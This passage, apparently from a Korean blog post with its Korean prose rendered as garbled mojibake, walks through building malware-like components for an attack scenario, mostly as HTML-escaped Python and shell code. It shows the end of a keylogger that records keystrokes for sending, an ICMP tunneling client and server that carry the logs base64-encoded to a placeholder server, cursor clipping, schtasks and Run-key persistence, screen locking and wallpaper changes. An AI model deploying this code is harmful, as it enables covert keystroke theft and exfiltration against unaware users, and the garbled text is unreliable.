                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Caps Lock]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Hangul]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Space]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Delete]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;186&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;';'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;187&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;188&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;189&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;190&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;191&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'`'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;219&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'['&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;']'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;lst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•´ë‹¹ KeyloggerëŠ” í‚¤ ë¡œê·¸ë¥¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;lst&lt;/code&gt;ì— ì €ì¥í•´ ë†“ë„ë¡ ë˜ì–´ ìˆê³ , ê³µë°±ë¥˜ ë¬¸ì(Enter, Tab, Space)ê°€ ì…ë ¥ë  ê²½ìš° ë¡œê·¸ë¥¼ ì „ì†¡í•˜ë„ë¡ êµ¬í˜„ë˜ì–´ ìˆìœ¼ë©° ì•ŒíŒŒë²³ê³¼ ìˆ«ìë¥¼ ì œì™¸í•œ ë¬¸ìë“¤ì— ëŒ€í•´ ì¢€ ë” ì§ê´€ì ìœ¼ë¡œ íŒŒì•…í•˜ê¸° ìœ„í•´ &lt;code class=&quot;highlighter-rouge&quot;&gt;KeyID&lt;/code&gt;ë¥¼ ì‚¬ìš©í•´ êµ¬ë¶„í•˜ê³  ë³„ë„ì˜ ë¬¸ìì—´ë¡œ êµ¬ë¶„í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ii-02-icmp-tunneling&quot;&gt;II-02 ICMP Tunneling&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ICMP Tunneling Client
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sendICMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Server IP'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'base64'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ICMP Tunneling Server
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sniffICMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;icmp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'base64'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¡œê·¸ë¥¼ ì „ì†¡í•˜ëŠ” ë¶€ë¶„ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;scapy&lt;/code&gt;ëª¨ë“ˆì„ ì‚¬ìš©í•˜ì—¬ ICMP Tunneling Server, Clientë¥¼ êµ¬í˜„í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;base64ë¡œ ì¸ì½”ë”©í•˜ì—¬ ì „ì†¡í•˜ëŠ” ê²ƒì€ ì‹œë‚˜ë¦¬ì˜¤ ìˆ˜í–‰ìƒ í•„ìš”í•œ ë¶€ë¶„ì´ë¯€ë¡œ ì œê±°í•´ë„ ë¬´ê´€í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ii-03-clipcursor&quot;&gt;II-03 ClipCursor&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-clipcursor&quot;&gt;ClipCursor function (winuser.h) - Win32 apps&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;win32api&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;moveCursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;win32api&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClipCursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•´ë‹¹ ê¸°ëŠ¥ì€ Windowsì—ì„œ í´ë¼ì´ì–¸íŠ¸ì˜ ë§ˆìš°ìŠ¤ ì»¤ì„œì˜ í–‰ë™ ì˜ì—­ì„ ì œí•œí•˜ëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;ClipCursor&lt;/code&gt;ì˜ ì¸ìë¡œ ë¹ˆ ê°’ì´ë‚˜ (0,0,0,0)ì„ ë„£ì„ ê²½ìš° í–‰ë™ ì˜ì—­ ì œí•œì´ í•´ì œë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ii-04-schedule&quot;&gt;II-04 Schedule&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/schtasks&quot;&gt;schtasks&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sam0700.png&quot; alt=&quot;/assets/sam0700.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2020/07/03 14:30ì— &lt;span class=&quot;s2&quot;&gt;&quot;Task Command&quot;&lt;/span&gt;ë¥¼ í•œ ë²ˆ ì‹¤í–‰ì‹œí‚¤ëŠ” ì‘ì—…ì„ &lt;span class=&quot;s2&quot;&gt;&quot;Task Name&quot;&lt;/span&gt;ì´ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ì‘ì—… ìŠ¤ì¼€ì¤„ ë“±ë¡
ex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SCHTASKS /create /sc ONCE /SD 2020/07/03 /ST 14:30 /TN &lt;span class=&quot;s2&quot;&gt;&quot;Task Name&quot;&lt;/span&gt; /TR &lt;span class=&quot;s2&quot;&gt;&quot;Task Command&quot;&lt;/span&gt;

/create ì‘ì—… ìŠ¤ì¼€ì¤„ ìƒì„±
/delete ì‘ì—… ìŠ¤ì¼€ì¤„ ì‚­ì œ
ex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SCHTASKS /delete /Tn &lt;span class=&quot;s2&quot;&gt;&quot;My Task&quot;&lt;/span&gt;
/run ë“±ë¡ëœ ì‘ì—… ìŠ¤ì¼€ì¤„ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ì›ê²©/ë¡œì»¬&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ì‹¤í–‰
ex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SCHTASKS /run /Tn &lt;span class=&quot;s2&quot;&gt;&quot;My Task&quot;&lt;/span&gt;
/end ì‘ì—… ìŠ¤ì¼€ì¤„ì— ì˜í•´ ì‹¤í–‰ëœ í”„ë¡œê·¸ë¨ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ì›ê²©/ë¡œì»¬&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ì¤‘ì§€

/sc MINUTE|HOURLY|DAILY|WEEKLY|MONTHLY ë§¤ë¶„|ì‹œê°„|ì¼|ì£¼|ë‹¬ ë§ˆë‹¤ ì‹¤í–‰
/sc ONCE ì§€ì •ëœ ë‚ ì§œ ë° ì‹œê°„ì— í•œ ë²ˆ ì‹¤í–‰
/sc ONSTART ì‹œìŠ¤í…œ ì‹œì‘ì‹œ ì‹¤í–‰
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Windowsì—ì„œ ì œê³µí•˜ëŠ” ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ë“±ë¡í•˜ëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. ì‹œë‚˜ë¦¬ì˜¤ ìˆ˜í–‰ì— íŠ¹ì • ë‚ ì§œì™€ ì‹œê°„ëŒ€ì— ë™ì‘í•˜ë„ë¡ í•˜ëŠ” ê¸°ëŠ¥ì´ ìš”êµ¬ë˜ì–´ êµ¬í˜„í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;*ì‹œì‘ í”„ë¡œê·¸ë¨&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;_winreg&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;keyVal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'Software\Microsoft\Windows\CurrentVersion\Run'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;key2change&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OpenKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HKEY_CURRENT_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyVal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KEY_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SetValueEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key2change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'MY Execution'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;REG_SZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ì— ì‘ì—… ë“±ë¡ê³¼ ë³„ê°œë¡œ â€œì‹œì‘ í”„ë¡œê·¸ë¨â€ì— í”„ë¡œê·¸ë¨ ì‹¤í–‰ì„ ë“±ë¡ì‹œí‚¬ ê²½ìš° ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ë“±ë¡í•˜ë©´ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ii-04-etc&quot;&gt;II-04 ETC&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Screen Lock&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ì‚¬ìš©ìì˜ í™”ë©´ì„ ì ê¸ˆí™”ë©´ìœ¼ë¡œ ì „í™˜&lt;/span&gt;
rundll32.exe user32.dll, LockWorkStation
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;O&lt;strong&gt;pen Image&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#ì „ì²´í™”ë©´ìœ¼ë¡œ open&lt;/span&gt;
start &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; /max &lt;span class=&quot;s2&quot;&gt;&quot;imagePath&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Change Wallpaper&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ì§€ì •ëœ ê²½ë¡œì˜ ì´ë¯¸ì§€ë¡œ ì‹œìŠ¤í…œ ë°°ê²½í™”ë©´ ë³€ê²½
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ctypes&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SPI_SETDESKWALLPAPER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; 
